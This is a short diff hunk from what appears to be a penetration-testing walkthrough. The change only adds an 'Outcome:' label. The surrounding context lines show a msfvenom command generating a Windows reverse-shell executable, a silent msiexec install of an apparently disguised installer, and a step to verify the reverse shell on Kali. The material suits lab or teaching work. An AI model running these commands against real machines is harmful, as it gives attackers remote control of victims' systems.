@@ -177,6 +177,8 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > nickvou
 msiexec /quiet /qn /i NCVInstaller.msi
 ```
 
+Outcome:
+
 ![MSI-Execution](/Pictures/MSI-Execution.png)
 
 14) Verify the reverse shell on your Kali machine:
